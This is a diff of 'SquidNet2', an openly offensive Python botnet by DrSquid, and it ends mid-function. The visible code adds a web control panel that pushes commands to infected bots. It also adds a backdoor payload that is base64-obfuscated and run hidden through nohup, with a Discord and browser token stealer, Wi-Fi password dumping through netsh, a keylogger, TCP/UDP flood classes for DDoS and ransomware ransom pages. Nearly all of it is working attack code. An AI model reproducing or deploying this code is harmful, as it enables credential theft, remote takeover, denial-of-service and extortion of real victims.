+                                    keyfile = open(name+".txt","r")
+                                    content = keyfile.read()
+                                    keyfile.close()
+                                    newkeyfile = open(name+".txt","w")
+                                    newkeyfile.write(content)
+                                    newkeyfile.write(f"\n[+] {keystroke}")
+                                    newkeyfile.close()
+                                except:
+                                    pass
                             else:
                                 try:
                                     display_single_msg = False
@@ -517,8 +767,11 @@ Advanced Botnet By DrSquid
                                                         filesize = int(msg.split()[1])
                                                     else:
                                                         bytesrecv += len(msg_from_bot)
-                                                        self.botdownload.write(msg_from_bot)
-                                                        if bytesrecv >= filesize:
+                                                        if msg.lower() != "file transfer to server completed.":
+                                                            self.botdownload.write(msg_from_bot)
+                                                        if bytesrecv >= filesize or msg.lower() == "file transfer to server completed.":
+                                                            if msg.lower() == "file transfer to server completed.":
+                                                                self.send_to_other(name,self.admin_username,"File transfer to server completed.", self.adminconn)
                                                             bytesrecv = 0
                                                             filesize = 0
                                                             self.downloading = False
@@ -530,8 +783,8 @@ Advanced Botnet By DrSquid
                         elif admin:
                             if not self.filetransfer:
                                 if msg.startswith("!help"):
-                                    self.log(f"[({datetime.datetime.today()})][(SERVER)--->({self.admin_username})]: Sent the help message.")
-                                    self.adminconn.send(self.help_msg().encode())
+                                    self.log(f"[({datetime.today()})][(SERVER)--->({self.admin_username})]: Sent the help message.")
+                                    self.adminconn.send(self.help_msg.encode())
                                 elif msg.startswith("!startftp"):
                                     self.send_to_other("SERVER",name, "Activiting FTP mode. You will be able to get files inside of the servers directory(for ex downloaded bot Files).", conn)
                                     self.send_to_other("SERVER",name, "You can input '!help' in case you need to know what commands are there for you.", conn)
@@ -550,51 +803,54 @@ Advanced Botnet By DrSquid
                                             self.focusing = True
                                     except:
                                         self.send_to_other("SERVER",name,"Invalid input! Here is the valid input: !focusconn <botname>", conn)
+                                elif msg.startswith("!exit"):
+                                    conn.close()
+                                    raise Exception("Admin closed connection.")
                                 elif msg.startswith("!banip"):
                                     try:
                                         banned_ip = msg.split()[1]
-                                        if banned_ip in self.return_iplist("allow"):
+                                        if banned_ip in self.whitelist:
                                             self.send_to_other("SERVER",name,f"The IP Address specified is in the whitelist! Unwhitelist it to ban it.", conn)
-                                        elif banned_ip in self.return_iplist("ban"):
+                                        elif banned_ip in self.banlist:
                                             self.send_to_other("SERVER",name,f"The IP Address specified is already in the banlist!", conn)
                                         else:
-                                            self.add_ip(banned_ip, "ban")
+                                            self.add_to_banlist(banned_ip)
                                             self.send_to_other("SERVER",name,f"IP Address '{banned_ip}' has been banned from the server.", conn)
                                     except:
                                         self.send_to_other("SERVER",name,f"Invalid input! Here is the valid input: !banip <ip>", conn)
                                 elif msg.startswith("!unbanip"):
                                     try:
                                         unbanning_ip = msg.split()[1]
-                                        if unbanning_ip not in self.return_iplist("ban"):
+                                        if unbanning_ip not in self.banlist:
                                             self.send_to_other("SERVER",name,f"The IP Address specified is not in the banlist!", conn)
                                         else:
-                                            self.remove_ip(unbanning_ip,"ban")
+                                            self.rem_fr_banlist(unbanning_ip)
                                             self.send_to_other("SERVER",name,f"IP Address '{unbanning_ip}' has been unbanned from the server.", conn)
                                     except:
                                         self.send_to_other("SERVER",name,f"Invalid input! Here is the valid input: !unbanip <ip>", conn)
                                 elif msg.startswith("!getipbanlist"):
-                                    self.send_to_other("SERVER",name,f"IP Ban List: {self.return_iplist('ban')}", conn)
+                                    self.send_to_other("SERVER",name,f"IP Ban List: {self.banlist}", conn)
                                 elif msg.startswith("!getipwhitelist"):
-                                    self.send_to_other("SERVER",name,f"IP White List: {self.return_iplist('allow')}", conn)
+                                    self.send_to_other("SERVER",name,f"IP White List: {self.whitelist}", conn)
                                 elif msg.startswith("!whitelistip"):
                                     try:
                                         whitelist_ip = msg.split()[1]
-                                        if whitelist_ip in self.return_iplist("allow"):
+                                        if whitelist_ip in self.whitelist:
                                             self.send_to_other("SERVER",name,f"The IP Address specified is already in the whitelist!", conn)
-                                        elif whitelist_ip in self.return_iplist("ban"):
+                                        elif whitelist_ip in self.banlist:
                                             self.send_to_other("SERVER",name,f"The IP Address specified is in the banlist!", conn)
                                         else:
-                                            self.add_ip(whitelist_ip, "allow")
+                                            self.add_to_whitelist(whitelist_ip)
                                             self.send_to_other("SERVER",name,f"IP Address '{whitelist_ip}' has been whitelisted in the server.", conn)
                                     except:
                                         self.send_to_other("SERVER",name,f"Invalid input! Here is the valid input: !whitelistip <ip>", conn)
                                 elif msg.startswith("!unwhitelistip"):
                                     try:
                                         unwhitelist_ip = msg.split()[1]
-                                        if unwhitelist_ip not in self.return_iplist("allow"):
+                                        if unwhitelist_ip not in self.whitelist:
                                             self.send_to_other("SERVER",name,f"The IP Address specified is not in the whitelist!", conn)
                                         else:
-                                            self.remove_ip(unwhitelist_ip,"allow")
+                                            self.rem_fr_whitelist(unwhitelist_ip)
                                             self.send_to_other("SERVER",name,f"IP Address '{unwhitelist_ip}' has been unwhitelisted from the server.", conn)
                                     except:
                                         self.send_to_other("SERVER",name,f"Invalid input! Here is the valid input: !unwhitelistip <ip>", conn)
@@ -603,7 +859,7 @@ Advanced Botnet By DrSquid
                                         self.listening = False
                                     elif self.listening == False:
                                         self.listening = True
-                                    self.log(f"[({datetime.datetime.today()})][(INFO)]: Listening for connections has been set to: {self.listening}")
+                                    self.log(f"[({datetime.today()})][(INFO)]: Listening for connections has been set to: {self.listening}")
                                     self.adminconn.send(f"\n[(SERVER)]: Listening for connections has been set to: {self.listening}".encode())
                                 elif msg.startswith("!stopfocus"):
                                     if not self.focusing:
@@ -616,11 +872,12 @@ Advanced Botnet By DrSquid
                                 elif msg.startswith("!getbotinfo"):
                                     if len(self.botinfo) == 0:
                                         self.send_to_other("SERVER",name, "There are no bots connected to the Botnet at the moment.", conn)
-                                    for bot in self.botinfo:
-                                        if "closed" in str(bot[5]):
-                                            self.botinfo.remove(bot)
-                                        else:
-                                            self.send_to_other("SERVER",name,f"Info on Bot {bot[0]} - IP: {bot[1]} Src-Port: {bot[2]} User: {bot[3]} OS: {bot[4]} Conn: {bot[5]}", self.adminconn)
+                                    else:
+                                        for bot in self.botinfo:
+                                            if "closed" in str(bot[5]):
+                                                self.botinfo.remove(bot)
+                                            else:
+                                                self.send_to_other("SERVER",name,f"Info on Bot {bot[0]} - IP: {bot[1]} Src-Port: {bot[2]} User: {bot[3]} OS: {bot[4]} Conn: {bot[5]}", self.adminconn)
                                 elif msg.startswith("!filedownload"):
                                     try:
                                         filename = self.get_filename(msg)
@@ -649,7 +906,7 @@ Advanced Botnet By DrSquid
                                     elif msg.startswith("!keylog"):
                                         self.send_to_other("SERVER",self.admin_username,"Activating Keylogger script on the bots(All of the logged keystrokes will be in a txt file with the bot's name).",self.adminconn)
                                         self.keylogging = True
-                                        botnames = self.obtain_botname_list()
+                                        botnames = self.botname_list
                                         for i in botnames:
                                             try:
                                                 keylogfile = open(f"{i}.txt","r")
@@ -719,7 +976,7 @@ Advanced Botnet By DrSquid
                                                 self.send_to_other("SERVER",name,f"Invalid input! Here is the valid input: !{protocol.lower()}flood <ip> <port> <delay>", conn)
                                     if not self.focusing and not self.downloading:
                                         if msg.strip() != "":
-                                            self.log(f"[({datetime.datetime.today()})][({self.admin_username})--->(BOTS)]: {msg}")
+                                            self.log(f"[({datetime.today()})][({self.admin_username})--->(BOTS)]: {msg}")
                                             display_single_msg = False
                                             for bot in self.connlist:
                                                 try:
@@ -734,12 +991,12 @@ Advanced Botnet By DrSquid
                                         if not self.downloading:
                                             if msg.strip() != "":
                                                 display_single_msg = False
-                                                self.log(f"[({datetime.datetime.today()})][({self.admin_username})--->({self.focus_botname})]: {msg}")
+                                                self.log(f"[({datetime.today()})][({self.admin_username})--->({self.focus_botname})]: {msg}")
                                                 self.focus_conn.send(msg.encode())
                             elif self.filetransfer:
                                 if msg.startswith("!help"):
-                                    self.adminconn.send(self.file_tranfer_help_msg().encode())
-                                    self.log(f"[({datetime.datetime.today()})][(SERVER)--->({self.admin_username})]: Sent the FTP Help message.")
+                                    self.adminconn.send(self.file_transfer_help_msg.encode())
+                                    self.log(f"[({datetime.today()})][(SERVER)--->({self.admin_username})]: Sent the FTP Help message.")
                                 elif msg.startswith("!download"):
                                     try:
                                         filename = self.get_filename(msg)
@@ -763,16 +1020,19 @@ Advanced Botnet By DrSquid
                         if display_single_msg:
                             if not msg.startswith("!login"):
                                 if not msg.startswith("!key") and msg.strip() != "":
-                                    self.log(f"[({datetime.datetime.today()})][({name})]: {msg}")
+                                    self.log(f"[({datetime.today()})][({name})]: {msg}")
                                     if conn != self.adminconn:
-                                        self.adminconn.send(f"\n[({name})]: {msg}".encode())
+                                        try:
+                                            self.adminconn.send(f"\n[({name})]: {msg}".encode())
+                                        except:
+                                            pass
                             else:
-                                self.log(f"[({datetime.datetime.today()})][({name})]: Attempting to log into the Admin Account.")
+                                self.log(f"[({datetime.today()})][({name})]: Attempting to log into the Admin Account.")
             except Exception as e:
                 if registered:
-                    self.log(f"[({datetime.datetime.today()})][(ERROR)]: Closing connection with {name} due to error: {e}")
+                    self.log(f"[({datetime.today()})][(ERROR)]: Closing connection with {name} due to error: {e}")
                 if conn == self.adminconn:
-                    self.log(f"[({datetime.datetime.today()})][(INFO)]: The admin has left the Botnet.")
+                    self.log(f"[({datetime.today()})][(INFO)]: The admin has left the Botnet.")
                     self.adminconn = None
                     self.admin_online = False
                 else:
@@ -793,8 +1053,313 @@ Advanced Botnet By DrSquid
                     pass
                 conn.close()
                 break
-    def gen_payload(self):
-        """The Payload script is located here. It is generated based on the server variables in the  '__init__' function. 
+    def Webserver(self):
+        """
+        # Web Interface Initiation
+
+        Essentially the `__init__()` function but with a webserver. It is better to keep the function
+        within the same class, as it makes obtaining data from the main botnet more easy and more bugless.
+        
+        It binds to `localhost:8000`. If that doesn't work then it will keep binding one port above
+        the previous until it can successfully bind an IP and port."""
+        self.wip = "localhost"
+        self.wport = 8000
+        self.webserv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        while True:
+            try:
+                self.webserv.bind((self.wip,self.wport))
+                break
+            except:
+                if self.wport >= 65535:
+                    self.wport = 0
+                self.wport += 1
+        self.log(f"[({datetime.today()})][(INFO)]: Web interface binded with 'http://{self.wip}:{self.wport}'")
+    def reformat_str(self, string):
+        """Turns every strange string into proper characters."""
+        return str(string).replace("+", " ").replace("%3C", "<").replace("%3E", ">").replace(
+        "%2F", "/").replace("%22", '"').replace("%27", "'").replace("%3D", "=").replace("%2B",
+        "+").replace("%3A", ":").replace("%28", "(").replace("%29", ")").replace("%2C", ","
+        ).replace("%3B", ";").replace("%20", " ").replace("%3F", "?").replace("%5C", "\\"
+        ).replace("%7B", "{").replace("%7D", "}").replace("%24", "$").replace("%0D", "\n"
+        ).replace("%0A", "   ").replace("%40","@").replace("%60","`").replace("%21","!"
+        ).replace("%92","'").replace("%93",'"')
+    def Weblisten(self):
+        """Web interface listening for connections."""
+        while True:
+            try:
+                self.webserv.listen()
+                conn, ip = self.webserv.accept()
+                handler = threading.Thread(target=self.Webhandler,args=(conn,))
+                handler.start()
+            except:
+                pass
+    def Webhandler(self, conn):
+        """
+        # Handling web interface connections
+
+        This function handles the connections of the web interface. Clients connect to it, and
+        there will be a packet generated from the `self.webgen_packet` property to then send 
+        back to the client. If there are query strings provided in the client's HTTP GET/ header
+        then there might be certain things done, such as IP banning, running commands and some
+        more things. This function is supposed to be simple, and is only able to parse information
+        from one query string.
+        """
+        try:
+            header = conn.recv(10240)
+            try:
+                header = header.decode()
+            except:
+                header = str(header)
+            query = header.split()[1]
+            try:
+                query_str = query.replace("/?","").split("=")[0]
+                data_str = self.reformat_str(query.replace("/?","").split("=")[1])
+            except:
+                query_str = ""
+                data_str = ""
+            if query_str == "cmd":
+                for i in self.botinfo:
+                    try:
+                        i[5].send(data_str.encode())
+                        self.log(f"[({datetime.today()})][(WEB)]: Executed Command '{data_str}' via the web interface.")
+                    except:
+                        pass
+            elif query_str == "kick":
+                for i in self.botinfo:
+                    if i[0] == data_str:
+                        try:
+                            i[5].close()
+                            self.log(f"[({datetime.today()})][(WEB)]: Kicked Bot '{data_str}' via the web interface.")
+                        except:
+                            pass
+            elif query_str == "ipban":
+                if data_str not in self.banlist:
+                    self.add_to_banlist(data_str)
+                    self.log(f"[({datetime.today()})][(WEB)]: Banned IP '{data_str}' via the web interface.")
+            elif query_str == "ipunban":
+                if data_str in self.banlist:
+                    self.rem_fr_banlist(data_str)
+                    self.log(f"[({datetime.today()})][(WEB)]: Unbanned IP '{data_str}' via the web interface.")
+            elif query_str == "ipwhitelist":
+                if data_str not in self.whitelist:
+                    self.add_to_whitelist(data_str)
+                    self.log(f"[({datetime.today()})][(WEB)]: Whitelisted IP '{data_str}' via the web interface.")
+            elif query_str == "ipunwhitelist":
+                if data_str in self.whitelist:
+                    self.rem_fr_whitelist(data_str)
+                    self.log(f"[({datetime.today()})][(WEB)]: Unwhitelisted IP '{data_str}' via the web interface.")
+            elif query_str == "kickadmin":
+                if data_str == "true":
+                    self.adminconn.close()
+                    self.log(f"[({datetime.today()})][(WEB)]: Kicked the admin connection via the web interface.")
+            conn.send("HTTP/1.0 200 OK\n".encode())
+            conn.send("Content-Type: text/html\n\n".encode())
+            conn.send(self.web_packet)
+            conn.close()
+        except Exception as e:
+            pass
+    @property
+    def web_packet(self):
+        """
+        # The HTML packet sent to the clients
+
+        Function that generates the packet to send to the client once they connect to the webserver.
+        This gets information from the main botnet, and displays it here. This makes the web interface
+        dynamic, updating as long as you reload.
+
+        Being able to actually learn some HTML in the year has allowed me to create a much better looking
+        web page, and making the previous web interface look like child's play.
+        """
+        pkt = """
+<head> 
+    <title>SquidNet2 Web Interface</title>
+    <style>
+        ._div{
+            margin-left: auto;
+            margin-right: auto;
+            background-color: rgba(238, 238, 238,0.75);
+        }
+        .imgcl{
+            width: 25%;
+            margin-left: auto;
+            margin-right: auto;
+            display: block;
+        }
+        .altext {
+            text-align: center;
+        }
+        h1,h2,h5 {
+            color: white;
+            text-align: center;
+        }
+        table {
+            border-collapse: collapse;
+        }
+        body {
+            font-family: sans-serif;
+            background-color: black;
+            background-image: url('https://media.discordapp.net/attachments/927541364781097011/946056834991685632/kali.jpg?width=1778&height=1000');
+        }
+        #roundedCorners { 
+            border-radius: 25px; 
+            border-spacing: 0;
+        }
+        #roundedCorners td, 
+        #roundedCorners th { 
+            border-bottom: 1px solid rgb(0, 0, 0);
+            padding: 10px; 
+        }
+        #roundedCorners tr:last-child > td {
+            border-bottom: none;
+        }
+        xmp{
+            display: inline;
+        } 
+    </style>
+</head>
+<body>
+    <script>
+        function sendreq(query,data){
+            var req = new XMLHttpRequest()
+            var reqget = `http://localhost:"""+str(self.wport)+"""/?${query}=${data}`
+            req.open("GET",reqget)
+            req.send()
+        }
+        function run_cmd(){
+            sendreq("cmd",document.ctrlpnl.cmd.value)
+        }
+        function _banip(){
+            sendreq("ipban",document.ctrlpnl.banip.value)
+        }
+        function _unbanip(){
+            sendreq("ipunban",document.ctrlpnl.unbanip.value)
+        }
+        function _whitelist(){
+            sendreq("ipwhitelist",document.ctrlpnl.whitelist.value)
+        }
+        function _unwhitelist(){
+            sendreq("ipunwhitelist",document.ctrlpnl.unwhitelist.value)
+        }
+        function kickconn(){
+            sendreq("kick",document.ctrlpnl.kick.value)
+        }
+        function adminkick(){
+            sendreq("kickadmin","true")
+        }
+    </script>"""+f"""
+<h1 style="font-size:50px;">SquidNet2 Web Interface</h1>
+<h2>The much better and more sophisticated version of SquidNet's original web interface.</h2>
+<h1>Server Configuration</h1>
+    <table id="roundedCorners" class="_div">
+        <tr>
+            <th>
+                Server Settings and Information
+            </th>
+        </tr>
+        <tr>
+            <td>
+                SquidNet2 Version: {self.version}<br>
+                Server IP: {self.ip}<br>
+                Server Port: {self.port}<br>
+                External IP: {self.external_ip}<br>
+                External Port: {self.external_port}<br>
+                <br>
+                Admin Username: {self.admin_username}<br>
+                Admin Password(hash): {self.admin_password}
+            </td>
+        </tr>
+        <tr>
+            <td>
+                SquidNet2 Log File: <a href="file://{os.path.join(os.getcwd(),self.logfile)}">{os.path.join(os.getcwd(),self.logfile)}</a><br>
+                SquidNet2 Payload: <a href="file://{os.path.join(os.getcwd(),self.payloadfile.name)}">{os.path.join(os.getcwd(),self.payloadfile.name)}</a>
+                <br>
+                My Github: <a href="https://github.com/DrSquidX">DrSquidX</a>
+            </td>
+        </tr>
+    </table>
+    <br><br>
+    <h1>More Information</h1>
+    <table id="roundedCorners" class="_div" style="width:70%;">
+        <tr>
+            <th>
+                About SquidNet2
+            </th>
+        </tr>
+        <tr>
+            <td style="word-wrap: break-word;">
+                SquidNet is an Open-Source penetration testing script that was designed to take control of computers with the running of a simple payload.
+                This script itself is just the server to handle the connections of the bots, and there is an admin script that is needed to actually
+                run commands remotely. There are numerous commands that can be used on the server, many of which are able to be used on all all operating
+                systems, with a few being exclusive to windows(as it is less secure and more exploitable).
+            </td>
+        </tr>
+    </table>
+    <br><br>
+    <table id="roundedCorners" class="_div">
+        <tr>
+            <th>SquidNet2 Commands List for Bots</th>
+        </tr>
+        <tr>
+            <td>
+                Utilities command section only usable by the admin!
+                <xmp>
+                    {self.help_msg}
+                </xmp>
+            </td>
+        </tr>
+    </table>
+    <h1>Bot Connections</h1>
+    <table id="roundedCorners" class="_div">
+        <tr>
+            <th>Name</th>
+            <th>IP Address</th>
+            <th>Source Port</th>
+            <th>User</th>
+            <th>OS</th>
+        </tr>
+        """
+        for i in self.botinfo:
+            info = ["<td><xmp>"+str(x)+"</xmp></td>" for x in i[:-1]]
+            pkt += f"""
+        <tr>
+            {"".join([i for i in info])}
+        </tr>""" if "closed" not in str(i[5]).lower() else ""
+        pkt += "</table>"
+        pkt += f"""    <h2>Admin Connected: {self.admin_online}</h2>
+    <form name="ctrlpnl">
+        <table id="roundedCorners" class="_div">
+            <tr>
+                <th>SquidNet2 Control Panel</th>
+            </tr>
+            <tr>
+                <td>
+                    Output will not be displayed!<br>
+                    <input type="text" name="cmd" placeholder="Enter a command to run on the SquidNet." size=40>
+                    <input type="button" value="Run" onclick="run_cmd()"><br>
+                    <input type="text" name="kick" placeholder="Kick a bot from SquidNet." size=40>
+                    <input type="button" value="Kick" onclick="kickconn()"><br>
+                    Kick the admin from the SquidNet <input type="button" value="Kick" onclick="adminkick()"><br>
+                    <input type="text" name="unbanip" placeholder="Unban an IP from SquidNet." size=40>
+                    <input type="button" value="Unban" onclick="_unbanip()"><br>
+                    <input type="text" name="banip" placeholder="Ban an IP from SquidNet." size=40>
+                    <input type="button" value="Ban" onclick="_banip()"><br>
+                    <input type="text" name="whitelist" placeholder="Whitelist an IP in SquidNet." size=40>
+                    <input type="button" value="Whitelist" onclick="_whitelist()"><br>
+                    <input type="text" name="unwhitelist" placeholder="Unwhitelist an IP in SquidNet." size=40>
+                    <input type="button" value="Unwhitelist" onclick="_unwhitelist()"><br>
+                </td>
+            </tr>
+        </table>
+    </form>
+        """
+        pkt += "</body>"
+        return pkt
+    @property
+    def payload(self):
+        """
+        # The SquidNet2 Payload
+
+        The Payload script is located here. It is generated based on the server variables in the `__init__()` function. 
         This is what the bots use to connect to the server. This script is really a backdoor, which opens the victim to 
         having their computer controlled remotely by the admin. There are a lot of referer and useragent tags, and the 
         reason for that is the DDoS Function. If the user, for whatever reason wants to commit a large scale DDoS Attack, 
@@ -802,14 +1367,93 @@ Advanced Botnet By DrSquid
         and eventually bring it down(Servers are really secure nowadays and DDoSing is illegal, so only DDoS Your own 
         servers please). There is also all of the code needed for controlling the bot. The functions are divided into 
         different classes, with the 3 types of DDoS Functions divided into different classes, with the main bot code 
-        in one separate class itself."""
+        in one separate class itself. This payload is also encoded into base64 bytes, so it would be hard to figure
+        out what it really is at first sight(I figured this out by looking at Metasploit Meterpreter payloads). If
+        the victim is on a OSX or Linux operating system, the bot script will execute via the 'nohup' command, so that
+        it could run in the background and be more hidden(simply use .pyw py2exe's for Windows machines). This would
+        allow the script to run, despite the user closing the application and/or terminal and therefore allow for a 
+        longer window to control the victim computer.
+        
+        The payload itself is expandable and threaded, which means you could have another script running as the payload
+        is doing its job. It makes the backdoor more hidden and appears to be something else."""
         payload = """
-import socket, threading, os, sys, urllib.request, random, time, shutil, subprocess, sqlite3
+import socket, threading, os, sys, urllib.request, random, time, shutil, subprocess, sqlite3, string
 try:
-    from cryptography.fernet import Fernet
-    from pynput.keyboard import Listener
+    from pynput.keyboard import Listener # pip install pynput
 except:
     pass
+try:
+    import win32crypt # pip install pypiwin32
+except:
+    pass
+try:
+    from cryptography.fernet import Fernet # pip install cryptography
+except:
+    pass
+try:
+    from Crypto.Cipher import AES # pip install pycryptodome
+except:
+    pass
+class TokenGrab:
+    def __init__(self, ):
+        self.tokens = []
+        self.os = sys.platform 
+    def verify_token(self,token):
+        period_count = 0
+        startswithupper = False
+        if list(token)[0] == list(token)[0].upper() and list(token)[0] in string.ascii_letters:
+            startswithupper = True
+        for i in token:
+            if i == ".":
+                period_count += 1
+        if period_count == 2 and startswithupper:
+            return True
+        return False
+    def grab_token(self,file_name):
+        file = open(file_name,"rb")
+        content = str(file.read())
+        printable = set(string.printable)
+        e = filter(lambda x: x in printable, content)
+        new_item = ""
+        for i in e:
+            new_item += i
+        newls = new_item.split("\\n")
+        tokens = []
+        for ii in newls:
+            if "oken" in ii:
+                item = ii.strip().split('"')
+                for iii in item:
+                    if len(iii) == 59:
+                        if " " not in iii:
+                            if self.verify_token(iii):
+                                tokens.append(iii)
+        return tokens
+    def find_tokens(self, path):
+        path += '\\\\Local Storage\\\\leveldb' if self.os == "win32" else "/Local Storage/leveldb"
+        tokens = []
+        for file_name in os.listdir(path):
+            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                continue
+            token = self.grab_token(path+("\\\\" if self.os == "win32" else "/" )+file_name)
+            tokens.extend(token)
+        return tokens
+    def main(self):
+        self.macdir = ""
+        if self.os == "win32":
+            local = os.getenv('LOCALAPPDATA')
+            roaming = os.getenv('APPDATA')
+            paths = {'Discord': roaming + '\\\\Discord','Discord Canary': roaming + '\\\\discordcanary','Discord PTB': roaming + '\\\\discordptb','Google Chrome': local + '\\\\Google\\\\Chrome\\\\User Data\\\\Default','Opera': roaming + '\\\\Opera Software\\\\Opera Stable','Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default','Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default'}
+        else:
+            self.macdir = os.popen("echo ~/library").read().strip().replace("/","\\\\")+"\\Application Support\\\\"
+            paths = {"Discord": self.macdir+"discord"}
+        for platform, path in paths.items():
+            if not os.path.exists(path if self.os == "win32" else path.replace("\\\\","/")):
+                continue
+            if self.os != "win32":
+                path = path.replace("\\\\","/")
+            tokens = self.find_tokens(path)
+            self.tokens.extend(tokens)
+        return self.tokens
 class DDoS:
     def __init__(self, ip, delay):
         self.ip = ip
@@ -4092,49 +4736,67 @@ class DDoS:
             except:
                 pass
 class TCP_UDP_Flood:
-    def __init__(self, ip, port, delay, pkt_size):
+    def __init__(self, ip, port, delay, pkt_size, thr_count):
         self.ip = ip
         self.port = int(port)
         self.delay = float(delay)
         self.pkt_size = int(pkt_size)
+        self.thread_count = thr_count
+        self.havingskillissues = False
         self.stop = False
     def gen_packet(self, size):
         return random._urandom(size)
     def UDP_Req(self):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.sendto(self.gen_packet(self.pkt_size), (self.ip, self.port))
-            s.close()
-        except:
-            pass
+        while not self.stop:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.sendto(self.gen_packet(self.pkt_size), (self.ip, self.port))
+                s.close()
+                if self.havingskillissues:
+                    self.havingskillissues = False
+                time.sleep(self.delay)
+            except KeyboardInterrupt:
+                self.stop = True
+            except Exception as e:
+                if "too big" in str(e).lower():
+                    self.pkt_size -= 1
+                    if not self.havingskillissues:
+                        self.havingskillissues = True
     def TCP_req(self):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((self.ip, self.port))
-            s.send(self.gen_packet(self.pkt_size))
-            s.close()
-        except:
-            pass
+        while not self.stop:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((self.ip, self.port))
+                s.send(self.gen_packet(self.pkt_size))
+                s.close()
+                if self.havingskillissues:
+                    self.havingskillissues = False
+                time.sleep(self.delay)
+            except KeyboardInterrupt:
+                self.stop = True
+            except Exception as e:
+                if "too big" in str(e).lower():
+                    self.pkt_size -= 1
+                    if not self.havingskillissues:
+                        self.havingskillissues = True
     def Stop_Atk(self):
         self.stop = True
     def TCP_Flood(self):
-        while True:
+        for i in range(self.thread_count):
             try:
                 tcp_req = threading.Thread(target=self.TCP_req)
                 tcp_req.start()
-                if self.stop:
-                    break
-                time.sleep(self.delay)
+            except KeyboardInterrupt:
+                self.stop = True
             except:
                 pass
     def UDP_Flood(self):
-        while True:
+        for i in range(self.thread_count):
             try:
                 udp_req = threading.Thread(target=self.UDP_Req)
                 udp_req.start()
-                if self.stop:
-                    break
-                time.sleep(self.delay)
+            except KeyboardInterrupt:
+                self.stop = True
             except:
                 pass
 class RansomWare:
@@ -4198,32 +4860,101 @@ class RansomWare:
         cmd = subprocess.Popen(f"cd {self.recovery_directory}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         _cmd = subprocess.Popen(f"curl -o barbara.png https://i.redd.it/w2eduogz9ir51.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     def recovering_html_code(self):
-        return f'''
+        return '''
 <!DOCTYPE html>
-<head></head>
-<title>You're in Luck | Your files are being decrypted!</title>
-<body bgcolor='red'>
-<h1>Lucky you!</h1>
-<h2>You have successfully put the correct encryption key into the text file({self.keyfile}).</h2>
-<h2>Please wait a moment, as the decrypted files are being decrypted at this moment.
-<h4>You can say your goodbyes to Barbara!</h4>
-<img src="barbara.png" alt="Where is the image?" width="300" height="500">
+<head>
+<style>
+    #roundedCorners { 
+        border-radius: 25px; 
+        border-spacing: 0;
+    }
+    #roundedCorners td, 
+    #roundedCorners th { 
+        border-bottom: 1px solid rgb(0, 0, 0);
+        padding: 10px; 
+    }
+    #roundedCorners tr:last-child > td {
+        border-bottom: none;
+    }
+</style>'''+f'''
+</head>
+<title>Yay! | You've entered the correct encryption key!</title>
+<body bgcolor='skyblue'>
+    <div style="font-family: sans-serif; text-align: center;">
+<h1 style="text-align: center;">You entered the correct encryption key!</h1>
+<table style="margin-left: auto; margin-right: auto; background-color: rgb(96, 99, 255);" id="roundedCorners">
+    <tr>
+        <td><h1>Lucky you!</h1></td>
+    </tr>
+    <tr>
+        <td>
+            <h3>Soon you will have your files back!</h3>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <h2>You have successfully put the correct encryption key into the text file({self.keyfile}).</h2>
+            <h2>Please wait a moment, as the decrypted files are being decrypted at this moment.
+            <h4>You can say your goodbyes to Barbara!</h4>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <img src="barbara.png" alt="Where is the image?" width="300" height="500" style="margin-left: auto; margin-right: auto;">
+        </td>
+    </tr>
+</table>
+</div>
 </body>
         '''
     def ransom_html_code(self):
-        return f'''
+        return '''
 <!DOCTYPE html>
-<head></head>
+<head>
+<style>
+    #roundedCorners { 
+        border-radius: 25px; 
+        border-spacing: 0;
+    }
+    #roundedCorners td, 
+    #roundedCorners th { 
+        border-bottom: 1px solid rgb(0, 0, 0);
+        padding: 10px; 
+    }
+    #roundedCorners tr:last-child > td {
+        border-bottom: none;
+    }
+</style>'''+f'''
+</head>
 <body bgcolor='red'>
+    <div style="font-family: sans-serif; text-align: center;">
 <title>Oops! | You've been Compromised!</title>
-<h1>Oops!</h1>
-<h2>Looks like your files have been encrypted.</h2>
-<h3>There is hope.</h3><br>
-A file has been created in this directory: {self.recovery_directory}{self.keyfile}<br>
-Simply place the encryption key of your files in the file(and this file only), and you will have your files back!<br>
-How you will get your key? Well, that's all up to the BotMaster.
-<h2>Heres a picture of Barbara! Perhaps she will give you emotional Support....</h2><br>
-<img src="barbara.png" alt="Where is the image?" width="300" height="500">
+<h1 style="text-align: center;">You have been compromised!</h1>
+<table style="margin-left: auto; margin-right: auto; background-color: rgb(255, 80, 67);" id="roundedCorners">
+    <tr>
+        <td><h1>Oops!</h1></td>
+    </tr>
+    <tr>
+        <td>
+            <h2>Looks like your files have been encrypted.</h2>
+            <h3>There is hope.</h3>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            A file has been created in this directory: {self.recovery_directory}{self.keyfile}<br>
+            Simply place the encryption key of your files in the file(and this file only), and you will have your files back!<br>
+            How you will get your key? Well, that's all up to the BotMaster.
+            <h2>Heres a picture of Barbara! Perhaps she will give you emotional Support....</h2><br>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <img src="barbara.png" alt="Where is the image?" width="300" height="500" style="margin-left: auto; margin-right: auto;">
+        </td>
+    </tr>
+</table>
+</div>
 </body>
         '''
     def check_key_file(self):
@@ -4347,6 +5078,83 @@ class Bot:
                     except RuntimeError:
                         pass
                 break
+    def obtainwifipass(self):
+        if sys.platform != "win32":
+            return "This bot is on a Apple-based product. Unable to get wifi passwords!"
+        else:
+            item = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
+            prof_names = (re.findall("All User Profile     : (.*)\\r", item))
+            passwords = []
+            check_networks = []
+            for i in prof_names:
+                item = subprocess.run(["netsh", "wlan", "show", "profiles", i], capture_output=True).stdout.decode()
+                security_key = False
+                security_key_present = (re.findall("Security key           : (.*)\\r", item))
+                if security_key_present[0] == "Present":
+                    check_networks.append(i)
+                else:
+                    pass
